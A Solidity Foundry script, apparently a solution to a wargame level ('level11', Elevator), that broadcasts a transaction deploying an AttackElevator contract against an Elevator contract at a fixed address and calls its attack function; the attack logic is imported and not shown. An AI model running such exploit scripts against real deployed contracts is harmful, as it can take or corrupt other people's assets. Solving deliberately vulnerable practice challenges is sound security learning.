// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Elevator} from "../src/level11/Elevator.sol";
import {AttackElevator} from "../src/level11/AttackElevator.sol";

contract level11Exploit is Script {
    Elevator elevator = Elevator(0xC00E5fDED66F7dF08Cd2E510E508548869275613);

    function run() external {
        vm.startBroadcast();

        AttackElevator attackElevator = new AttackElevator(address(elevator));
        attackElevator.attack();

        vm.stopBroadcast();
    }
}
